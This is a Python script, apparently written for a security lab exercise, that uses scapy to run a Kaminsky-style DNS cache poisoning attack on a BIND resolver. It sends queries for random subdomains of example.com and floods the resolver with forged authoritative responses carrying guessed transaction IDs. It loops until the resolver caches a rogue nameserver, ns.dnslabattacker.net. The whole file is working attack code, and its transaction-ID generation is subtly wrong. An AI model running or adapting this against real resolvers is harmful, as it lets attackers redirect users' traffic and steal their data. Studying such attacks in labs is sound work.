#!/usr/bin/env python
import argparse
import socket
import time

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

def prep(response):
    ip_address = "1.2.3.4"
    name_server = "ns.dnslabattacker.net."
    domain = 'example.com.'
    domain_ = 'example.com'
    rand_id = getRandomTXID()

    response.id = rand_id
    response.an.rdata = ip_address


    num_ns = response.nscount
    i = 0
    for i in range (num_ns):
        response.ns[i].rdata = name_server
        response.ns[i].rrname = domain

    response.aa = 1
   

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096)
    response = DNS(response)
    


    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

    

    prep(response)
    
    
    while (1==1):
       
        rand_domain = getRandomSubDomain()
        new_domain = rand_domain + '.example.com.'
        qd_name = rand_domain + '.example.com'
        dnsPacket.qd.qname = qd_name
        response.qd.qname = new_domain
        response.an.rrname = new_domain

        sendPacket(sock, dnsPacket, my_ip, my_port)

        for i in range(100):
            response.id = getRandomTXID()
            sendPacket(sock,response, my_ip, my_query_port)
        

        packet = DNS(rd =1, qd = DNSQR(qname= 'example.com'))
        sendPacket(sock,packet,my_ip, my_port)
        answer, address = sock.recvfrom(4096)
        response_packet = DNS(answer)
        #print 'response '
        #response_packet.show()
        
        if (response_packet[DNS].ns[DNSRR][0].rdata == "ns.dnslabattacker.net."):
            print("success")
            break;
        else:
            print "still failure"
        




if __name__ == '__main__':
    exampleSendDNSQuery()
